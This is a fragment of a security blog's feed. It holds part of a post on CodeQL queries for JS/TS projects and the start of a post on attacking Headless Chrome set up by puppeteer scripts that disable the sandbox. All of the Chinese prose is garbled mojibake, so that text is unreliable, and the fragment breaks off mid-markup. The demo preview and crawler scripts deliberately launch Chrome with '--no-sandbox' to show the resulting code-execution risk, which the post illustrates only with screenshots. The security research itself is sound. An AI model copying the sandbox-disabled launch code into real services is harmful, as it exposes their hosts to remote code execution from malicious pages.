&lt;your_prj&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¯¹äºæ¯”è¾ƒå¤§å‹çš„é¡¹ç›®æ¥è¯´ï¼Œå› ä¸ºCodeQLæ˜¯Javaå†™çš„ï¼Œæ‰€ä»¥å¯èƒ½ä¼šå­˜åœ¨å†…å­˜ä¸è¶³å¯¼è‡´æ„å»ºæ•°æ®åº“å¤±è´¥çš„æƒ…å†µï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FATAL ERROR: Ineffective mark-compacts near heap <span class="built_in">limit</span> Allocation failed -</span><br><span class="line">JavaScript heap out of memory</span><br></pre></td></tr></table></figure><p>é»˜è®¤ç»™çš„å†…å­˜æ˜¯<code>2400MB</code>ï¼Œå¤§é¡¹ç›®å¿…ç„¶ä¸å¤Ÿå•Šï¼Œæ–‡ä»¶å¤ªå¤šäº†ã€‚</p><p>æ‰¾äº†ä¸€åœˆæ²¡æœ‰è§£å†³æ–¹æ¡ˆï¼Œç´¢æ€§ç›´æ¥æå‡ºJD_GUIæŠŠå®ƒçš„jaråŒ…ç»™åç¼–è¯‘äº†ï¼Œå‘ç°æ˜¯é€šè¿‡ç¯å¢ƒå˜é‡æ§åˆ¶çš„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> SEMMLE_TYPESCRIPT_RAM=8000</span><br></pre></td></tr></table></figure><p><strong>è¿™ä¸ªä¸æ˜¯ç»™JAVAçš„é‚£ä¸ªå†…å­˜è®¾ç½®(<code>-J-Xmx1234M</code>)</strong></p><h1 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h1><h2 id="æ¥å£å‡½æ•°"><a href="#æ¥å£å‡½æ•°" class="headerlink" title="æ¥å£å‡½æ•°"></a>æ¥å£å‡½æ•°</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">interface FooInterface&#123;</span><br><span class="line">4&#x2F;&#x2F;...</span><br><span class="line">&#125;</span><br><span class="line">export interface outerApiConfig &#123;</span><br><span class="line"></span><br><span class="line">4foo: (params: xxxxx) &#x3D;&gt; Promise&lt;&#123; &#x2F;&#x2F; whatever ..&#125;&gt;;</span><br><span class="line">4</span><br><span class="line">4bar: (params: FooInterface) &#x3D;&gt; Promise&lt;&#123; &#x2F;&#x2F; whatever..&#125;&gt;;</span><br><span class="line">4</span><br><span class="line">4&#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿è¿™ä¸ªDemoä¸ºä¾‹ï¼Œå¾ˆå¤šæ¥å£å‡½æ•°ç»Ÿä¸€å¯¼å‡ºï¼Œéœ€è¦å€ŸåŠ©<code>InterfaceDeclaration</code> æ¥æ‰¾ï¼Œä¸è¿‡æˆ‘çš„æ–¹æ³•æœ‰ç‚¹â€œç¬¨â€ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import javascript</span><br><span class="line"></span><br><span class="line">predicate isOuterAPIs(Function f)&#123;</span><br><span class="line">     exists(InterfaceDeclaration apis |</span><br><span class="line">         apis.getIdentifier().toString() = "outerApiConfig" and</span><br><span class="line">         apis.getAMember().getName() = f.getName()</span><br><span class="line">     )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where isOuterAPIs(f)</span><br><span class="line"><span class="keyword">select</span> f.getName()</span><br></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œå®ç°å¾ˆç²—æš´ï¼Œå°±æ˜¯é™åˆ¶å‡½æ•°å(å­—ç¬¦ä¸²å€¼)å’ŒInterfaceé‡Œæˆå‘˜åå­—(å­—ç¬¦ä¸²å€¼)ä¸€è‡´ï¼Œå°±è®¤ä¸ºè¿™ä¸ªå‡½æ•°æ˜¯å¯¼å‡ºæ¥å£ä¸­çš„å‡½æ•°ã€‚</p><h2 id="ç‰¹å®šå‚æ•°çš„å¤„ç†"><a href="#ç‰¹å®šå‚æ•°çš„å¤„ç†" class="headerlink" title="ç‰¹å®šå‚æ•°çš„å¤„ç†"></a>ç‰¹å®šå‚æ•°çš„å¤„ç†</h2><p>åœ¨æˆ‘çš„éœ€æ±‚ä¸­ï¼Œæˆ‘éœ€è¦é‡ç‚¹å…³æ³¨ï¼Œå‚æ•°ä¸­å¸¦æœ‰è·¯å¾„çš„å‡½æ•°ï¼Œæ¢è¨€ä¹‹å°±æ˜¯éœ€è¦è¯†åˆ«å‡ºè¿™ä¹ˆå¤šæ¥å£å‡½æ•°ä¸­ï¼Œå‚æ•°å¸¦æœ‰<code>path</code>çš„æƒ…å†µï¼Œé‚£ä¹ˆå¾ˆç›´æ¥çš„æ€è·¯å°±æ˜¯åˆ©ç”¨æ­£åˆ™ï¼Œä½†æ˜¯åœ¨å®é™…çš„åœºæ™¯ä¸‹ï¼Œä½ ä¼šå‘ç°ä»£ç çœŸçš„å†™å‡ºäº†â€œèŠ±â€ï¼Œä¸æ˜¯å¸¸è§„çš„queryèƒ½è¦†ç›–çš„ã€‚</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">foo: <span class="function">(<span class="params">params: WTFParams</span>) =&gt;</span> <span class="built_in">Promise</span>&lt;....&gt;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bar: <span class="function">(<span class="params">params: &#123; arg: <span class="built_in">string</span> &#125;</span>) =&gt;</span> <span class="built_in">Promise</span>&lt;&#123; ...&#125;&gt;;</span><br><span class="line">                                           </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">magic</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>å‚æ•°æ˜¯ä¸€ä¸ªinterfaceï¼Œä½ éœ€è¦å¯¹è¿™ä¸ªinterfaceå†é™åˆ¶ï¼Œå³è¿™ä¸ªinterfaceçš„æˆå‘˜æ˜¯ä¸æ˜¯path</p></li><li><p>å‚æ•°ç›´æ¥å°±æ˜¯ {arg : string} è¿™ç±»æƒ…å†µ</p></li><li><p>å¥‡æ€ªçš„å‡½æ•°å†™æ³•ï¼Œå‡½æ•°ä½“åœ¨returné‡Œ</p></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class PathParamInterfaceType extends InterfaceType&#123;</span><br><span class="line">    PathParamInterfaceType()&#123;</span><br><span class="line">        getInterface().getAMember().getName().toLowerCase().indexOf("path") &gt; 0</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate isParamPath(Function f)&#123;</span><br><span class="line">    (</span><br><span class="line">        f.getAParameter().getType() instanceof PathParamInterfaceType</span><br><span class="line">        or</span><br><span class="line">        f.getAParameter().getType().toString().toLowerCase().indexOf("path") &gt; 0</span><br><span class="line">    ) or</span><br><span class="line">    (</span><br><span class="line">        f.getNumParameter() = 0</span><br><span class="line">        and</span><br><span class="line">        f.getAReturnStmt().getExpr().(Function).getAParameter().getType().toString().toLowerCase().indexOf("path") &gt; 0</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¿…é¡»ä¾èµ–TaintTrackingå—"><a href="#å¿…é¡»ä¾èµ–TaintTrackingå—" class="headerlink" title="å¿…é¡»ä¾èµ–TaintTrackingå—"></a>å¿…é¡»ä¾èµ–TaintTrackingå—</h2><p>æœ€åä¸€ä¸ªé—®é¢˜æ¯”è¾ƒç®€å•äº†ï¼Œå°±æ˜¯æœ‰äº†sourceï¼Œç„¶åå†æ‰¾åˆé€‚çš„sinkï¼Œçœ‹æœ‰æ²¡æœ‰è·¯å¾„å°±è¡Œäº†ï¼›ä½†æ˜¯å…¶å®è¿˜æœ‰ä¸€ç§åŠæ³•ä¼šæ¥å¾—æ›´ç›´æ¥ï¼Œå°±æ˜¯åˆ©ç”¨ä¼ é€’é—­åŒ…ï¼Œä½†æ˜¯ä¼šå¸¦æ¥æ¯”è¾ƒå¤šçš„è¯¯æŠ¥ï¼Œå¥½å¤„æ˜¯å®ç°èµ·æ¥ç®€å•ï¼Œæƒ³è¦æ’é™¤è¯¯æŠ¥ï¼Œåªéœ€è¦å¢åŠ é™åˆ¶å³å¯ï¼Œçœ‹å…·ä½“éœ€æ±‚å§ï¼Œå“ªä¸ªæ–¹æ³•åˆé€‚ç”¨å“ªä¸ªã€‚</p><p>CodeQLçš„JS/TSéƒ¨åˆ†å®ç°ä¸å¦‚cppå¤šï¼Œæ‰€ä»¥æœ‰äº›predicateéœ€è¦è‡ªå·±æ‰‹åŠ¨å®ç°ï¼Œæ¯”å¦‚ç”¨cppåšqueryå¯ä»¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FunctionCall getFunctionToACall(FunctionCall fc)&#123;</span><br><span class="line">  result &#x3D; fc.getBasicBlock().getEnclosingFunction().getACallToThisFunction()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">select</span><br><span class="line">        getFunctionToACall*(FunctionCall fc)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯JS/TSéƒ¨åˆ†æ²¡æœ‰<code>getACallToThisFunction</code> ï¼Œæ ¹æ®åŸç†ï¼Œæ‰‹åŠ¨å®ç°ä¸€ä¸ªå³å¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CallExpr getACallToThisFunction(Function f)&#123;</span><br><span class="line">    exists( CallExpr c |</span><br><span class="line">        c.getCalleeName() &#x3D; f.getName() and</span><br><span class="line">        result &#x3D; c</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CallExpr getFunctionToACall(CallExpr call)&#123;</span><br><span class="line">    result &#x3D; getACallToThisFunction(call.getEnclosingFunction())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œå¦‚æœæƒ³è¦æŸ¥è¯¢fooå‡½æ•°çš„ä¼ é€’é—­åŒ…ï¼Œå°±å¯ä»¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from CallExpr <span class="keyword">call</span></span><br><span class="line"><span class="keyword">where</span> call.getCalleeName() = <span class="string">"foo"</span></span><br><span class="line"><span class="keyword">select</span> getFunctionToACall*(<span class="keyword">call</span>)</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/7482">https://xz.aliyun.com/t/7482</a></p><p><a href="https://securitylab.github.com/tools/codeql">CodeQL for research</a></p><p><a href="https://ctftime.org/writeup/22177">https://ctftime.org/writeup/22177</a></p><p><a href="https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html">https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html</a></p><p><a href="https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/codeql_xnu.md">https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/codeql_xnu.md</a></p><p><a href="https://codeql.github.com/docs/codeql-cli/">https://codeql.github.com/docs/codeql-cli/</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å…³äº&quot;&gt;&lt;a href=&quot;#å…³äº&quot; class=&quot;headerlink&quot; title=&quot;å…³äº&quot;&gt;&lt;/a&gt;å…³äº&lt;/h1&gt;&lt;p&gt;ä¹‹å‰åšè¿‡çš„ä¸€äº›ä½¿ç”¨CodeQLå¯¹JS/TSé¡¹ç›®åšæ‰«æçš„ç¬”è®°ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ç¬”è®°" scheme="https://o0xmuhe.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="CodeQL" scheme="https://o0xmuhe.github.io/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>Exploit Headless Chrome</title>
    <link href="https://o0xmuhe.github.io/2021/05/26/Chrome-headless-exploit/"/>
    <id>https://o0xmuhe.github.io/2021/05/26/Chrome-headless-exploit/</id>
    <published>2021-05-26T07:26:26.000Z</published>
    <updated>2021-06-23T09:53:13.448Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>Chrome M59å¼•å…¥äº† Headless Chromeï¼Œè‡³æ­¤å¯ä»¥åœ¨æ— GUIçš„ç¯å¢ƒä¸‹ä½¿ç”¨Chromeï¼Œæå¤§çš„æ–¹ä¾¿äº†è‡ªåŠ¨åŒ–æµ‹è¯•å·¥ä½œï¼Œä¹Ÿå¯ä»¥ç”¨äºé¢„è§ˆæœåŠ¡ï¼Œæˆ–è€…ç½‘ç»œçˆ¬è™«ã€‚</p><a id="more"></a><p>å‰ç«¯å¹¶ä¸æ˜¯æˆ‘çš„å¼ºé¡¹ï¼Œæˆ‘åœ¨ä¸Šç½‘å†²æµªçš„æ—¶å€™å‘ç°ä¸€ä¸ªå¾ˆæœ‰è¶£çš„ç°è±¡ï¼š</p><ol><li>å¾ˆå¤šæŠ€æœ¯æ–‡ç« ç›¸äº’å‚è€ƒï¼Œæœ‰äº›ä»£ç è‡ªç„¶ä¹Ÿç›´æ¥å¤åˆ¶ç²˜è´´ä½¿ç”¨</li><li>Headless Chromeè‡ªç„¶ä¹Ÿæ˜¯è¿™æ ·ï¼Œä¸€äº›ä¸å¥½çš„ç¼–ç¨‹ä¹ æƒ¯ä¹Ÿè¢«é”™è¯¯åœ°ä¼ æ’­</li></ol><p>äºæ˜¯æœ‰äº†æœ¬æ–‡ï¼Œä»¥åŠä¸€äº›ä¸ªäººçš„æ€è€ƒã€‚</p><h2 id="æ€è€ƒ-ğŸ¤”"><a href="#æ€è€ƒ-ğŸ¤”" class="headerlink" title="æ€è€ƒ ğŸ¤”"></a>æ€è€ƒ ğŸ¤”</h2><p>é¦–å…ˆï¼Œåœ¨Googleæœç´¢Headless Chromeç›¸å…³çš„æŠ€æœ¯æ–‡ç« ï¼Œä¼šè·³å‡ºæ¥å®˜æ–¹æ–‡æ¡£ä»¥åŠå„ç§æŠ€æœ¯æ–‡ç« :</p><p>(å…³é”®è¯é¡ºåºåäº†ï¼Œä¸è¿‡ä¸å½±å“ XD )</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.41.22@2x.png" alt="CleanShot 2021-05-26 at 15.41.22@2x"></p><p>Headless Chromeå…¶å®å°±æ˜¯ä»å‘½ä»¤è¡Œå¯åŠ¨Chromeï¼Œä¼ é€’äº†<code>--headless</code>çš„å‚æ•°ï¼Œé‚£ä¹ˆå¯¹äºChromeæ¥è¯´ï¼Œæœ‰å¾ˆå¤šå‚æ•°ï¼Œä½†æ˜¯æœ‰é‚£ä¹ˆå‡ ä¸ªå‚æ•°éå¸¸å±é™©ï¼Œæ¯”å¦‚ : <code>--no-sandbox</code>ï¼Œ<code>--disable-web-security</code>ï¼Œä»¥åŠå¼€å¯è°ƒè¯•ç«¯å£â€¦</p><p>åœ¨çœ‹äº†å¾ˆå¤šç½‘ä¸Šçš„æ–‡ç« åï¼Œæˆ‘å‘ç°æœ‰ä¸å°‘ä»£ç æ˜¯é‡å¤çš„ï¼ˆå…³é”®é€»è¾‘ï¼‰ï¼Œæ¯”å¦‚è¿™ç¯‡:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.47.37@2x.png" alt="CleanShot 2021-05-26 at 15.47.37@2x"></p><p>å¯¹äºé”™è¯¯çš„å‚æ•°ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæ¯”å¦‚ä¸çº¦è€ŒåŒåœ°å…³é—­sandbox:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(</span><br><span class="line">  &#123;<span class="attr">args</span>: [<span class="string">'--no-sandbox'</span>, <span class="string">'--disable-setuid-sandbox'</span>] &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>æˆ–è€…è°ƒè¯•ç«¯å£ä¸æ˜¯ 9222å°±æ˜¯9229è¿™ç±»æƒ…å†µã€‚ è¿™é‡Œå…¶å®æœ‰å‡ ä¸ªé—®é¢˜ï¼š</p><ol><li>æˆ‘ä½¿ç”¨çš„å‚æ•°æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</li><li>è¿™äº›å‚æ•°å¯¹æˆ‘çš„ç¨‹åºæœ‰ä»€ä¹ˆå½±å“ï¼Ÿ</li><li>è¿™äº›å‚æ•°å®‰å…¨å—ï¼Ÿ</li><li>ä»€ä¹ˆæƒ…å†µä¸‹æˆ‘å¯ä»¥ç”¨ï¼Œä»€ä¹ˆæƒ…å†µä¸‹ä¸èƒ½ä½¿ç”¨ï¼Ÿ</li></ol><p>å¦‚æœæä¸æ¸…æ¥šï¼Œå¯¹äºåªæ˜¯ä¸ªäººå­¦ä¹ æ¥è¯´æä¸ªdemoé‚£å€’è¿˜å¥½ï¼Œå¦‚æœè¯´æ˜¯ç”¨äºå®é™…é¡¹ç›®ï¼Œæ¯”å¦‚å†™é¢„è§ˆæœåŠ¡ï¼Œçˆ¬è™«ç­‰é¡¹ç›®ï¼Œè¿˜æ˜¯ç›´æ¥ä½¿ç”¨äº†è¿™äº›å±é™©çš„å‚æ•°é‚£å°±å¤ªå±é™©äº†ã€‚</p><ol><li>çº¿ä¸Šç¯å¢ƒè¦æ±‚ç¨³å®šï¼Œä¸ä¸€å®šæ˜¯æœ€æ–°ç‰ˆæœ¬nodeï¼Œå³ä¸ä¸€å®šæ˜¯æœ€æ–°ç‰ˆæœ¬Chrome</li><li>å±é™©çš„å‚æ•°(æ¯”å¦‚<code>--disable-web-security</code>)ï¼Œæ²¡æœ‰å¼€å¯æ²™ç®±ï¼Œå¼€äº†è°ƒè¯•ç«¯å£ç­‰</li></ol><p><code>è€ç‰ˆæœ¬Chrome + NOSANDBOX = RCE</code> ğŸ¤”</p><p>è‡³æ­¤ï¼Œæˆ‘è®¤ä¸ºå¯ä»¥æä¸ªDemoéªŒè¯ä¸€ä¸‹è¿™ä¸ªæ”»å‡»æ€è·¯æ˜¯å¦å¯è¡Œã€‚</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="Pages"><a href="#Pages" class="headerlink" title="Pages"></a>Pages</h3><p>è¿™é‡Œç›´æ¥æ‰’äº†xlabæŸæ¬¡å®‰å…¨æ¨é€ï¼Œç„¶ååœ¨æœ¬åœ°è·‘èµ·æ¥ï¼Œå‡è£…æ˜¯ä¸€ä¸ªç›®æ ‡ç½‘é¡µï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.56.06@2x.png" alt="CleanShot 2021-05-26 at 15.56.06@2x"></p><p>ä¸‹é¢æä¸¤ä¸ªåœºæ™¯å§ï¼Œç¬¬ä¸€ä¸ªæ˜¯é¢„è§ˆï¼Œç®€åŒ–ä¸€ä¸‹ï¼Œæˆªå›¾å¥½äº†ï¼›ç¬¬äºŒä¸ªæ˜¯çˆ¬è™«ï¼Œçˆ¬å–è¿™ç½‘é¡µä¸Šçš„ä¿¡æ¯ã€‚</p><h3 id="Demo1-é¢„è§ˆ"><a href="#Demo1-é¢„è§ˆ" class="headerlink" title="Demo1 : é¢„è§ˆ"></a>Demo1 : é¢„è§ˆ</h3><p>é¢„è§ˆçš„åœºæ™¯æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚å¸¸è§çš„IMä¸­ï¼Œå‘é€çš„URLå¯èƒ½ä¼šè¢«æ¸²æŸ“æˆâ€œå¡ç‰‡â€ï¼Œä¸åŒIMå¤„ç†ä¸ä¸€æ ·ï¼Œä¸€èˆ¬æ¥è¯´åªæœ‰ç™½åå•æ‰ä¼šè¿™æ ·ã€‚</p><p>æˆ‘è¿™è¾¹ä¸ä¼šæå¤ªå¤æ‚çš„ä¸œè¥¿ï¼Œå°±ç›´æ¥ç”¨æˆªå›¾ä»£æ›¿äº†ï¼Œç›´æ¥ä¹Ÿä»ç½‘ä¸Šâ€ä¸œæ‹¼è¥¿å‡‘â€œç‚¹ä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    targetUrl = <span class="string">"https://www.google.com.hk"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> args = process.argv.slice(<span class="number">2</span>)</span><br><span class="line">        targetUrl = args[<span class="number">0</span>];</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FIXME : I should open SANDBOX, this cmdline is wrong !!!</span></span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123; <span class="attr">executablePath</span>: <span class="string">'/usr/bin/google-chrome'</span>, </span><br><span class="line">                                            args: [<span class="string">'--no-sandbox'</span>, <span class="string">'--disable-setuid-sandbox'</span>] &#125;);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.goto(targetUrl);</span><br><span class="line">    <span class="keyword">await</span> page.screenshot(&#123; <span class="attr">path</span>: <span class="string">'res.png'</span> &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> browser.close();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>åŠŸèƒ½ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œé¢„è§ˆæŒ‡å®šçš„ç½‘é¡µï¼Œæˆ‘è¿™é‡Œæå¾—ç®€å•ï¼Œç›´æ¥æˆªå›¾ç„¶åä¿å­˜ï¼ŒIMé‡Œé‚£ç§å¡ç‰‡å¼ä¸çŸ¥é“æ€ä¹ˆæï¼Œå°±æ²¡å»å°è¯•ï¼Œä¸è¿‡ä¹Ÿæ˜¯ä¸ªæ”»å‡»é¢å•¦ ğŸ¤£</p><p>è·‘ä¸€ä¸‹Demoï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.57.20@2x.png" alt="CleanShot 2021-05-26 at 15.57.20@2x"></p><p>å¦‚æœåœ¨é¡µé¢é‡ŒåŠ è½½æ¶æ„çš„JSå‘¢ï¼Ÿ</p><ul><li><p>ç›´æ¥ä½¿ç”¨script æ ‡ç­¾åŠ è½½</p></li><li><p>åŠ å…¥jsï¼Œä½¿ç”¨js web workeråŠ è½½</p></li></ul><p>BOOM : </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.59.02@2x.png" alt="CleanShot 2021-05-26 at 15.59.02@2x"></p><h3 id="Demo2-çˆ¬è™«"><a href="#Demo2-çˆ¬è™«" class="headerlink" title="Demo2 : çˆ¬è™«"></a>Demo2 : çˆ¬è™«</h3><p>è¿™é‡Œç›´æ¥æŠ„äº†<a href="https://www.anquanke.com/post/id/103350">https://www.anquanke.com/post/id/103350</a> é‡Œçš„ä»£ç :</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ cat crawler.js </span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer'</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// FIXME : I should open SANDBOX, this cmdline is wrong !!!</span></span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123; <span class="attr">executablePath</span>: <span class="string">'/usr/bin/google-chrome'</span>, <span class="attr">args</span>: [<span class="string">'--no-sandbox'</span>, <span class="string">'--disable-setuid-sandbox'</span>] &#125;);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">'http://localhost/foo.html'</span>, &#123;</span><br><span class="line">        waitUntil: <span class="string">'networkidle0'</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//count </span></span><br><span class="line">    <span class="keyword">let</span> eleCount = <span class="keyword">await</span> page.evaluate(<span class="function">(<span class="params">sel</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">document</span>.getElementsByClassName(sel).length;</span><br><span class="line">    &#125;, <span class="string">'category'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(eleCount != <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">let</span> htmlArray = <span class="keyword">await</span> page.evaluate(<span class="function">(<span class="params">sel, eleCount</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> element = <span class="built_in">document</span>.querySelectorAll(sel);</span><br><span class="line">            <span class="keyword">let</span> htmlArray = [];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= eleCount; i++)&#123;</span><br><span class="line">                htmlArray[i] = element[i].innerText;</span><br><span class="line">            &#125;</span><br><span class="line">            htmlArray.shift();</span><br><span class="line">            <span class="keyword">return</span> htmlArray;</span><br><span class="line">        &#125;, <span class="string">'p'</span>, eleCount);</span><br><span class="line">      <span class="built_in">console</span>.log(htmlArray);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> browser.close();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>é¢„æœŸè¡Œä¸ºï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2016.00.39@2x.png" alt="CleanShot 2021-05-26 at 